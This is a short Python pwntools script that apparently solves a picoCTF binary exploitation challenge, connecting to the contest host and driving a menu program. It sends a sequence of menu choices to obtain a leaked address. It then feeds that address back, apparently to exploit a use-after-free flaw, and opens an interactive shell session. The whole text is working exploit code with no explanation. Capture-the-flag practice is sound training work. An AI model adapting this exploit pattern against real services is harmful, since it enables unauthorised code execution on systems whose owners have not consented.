from pwn import *
context.binary = "./vuln"
#p = process()
p = remote("mercury.picoctf.net", 61817)
#gdb.attach(p)
p.sendline(b'm')
time.sleep(0.2)
p.recv()
p.sendline(b'A'*4)
p.recv()
p.sendline(b's')
p.recvuntil(b'...')
leak = int(p.recvline().strip(b'\n').decode(),base=16)
log.info("Leak: %s", hex(leak))
p.sendline(b'i')
p.recv()
p.sendline(b'Y')
p.recv()
p.sendline(b'l')
p.recv()
p.sendline(p32(leak))
p.interactive()
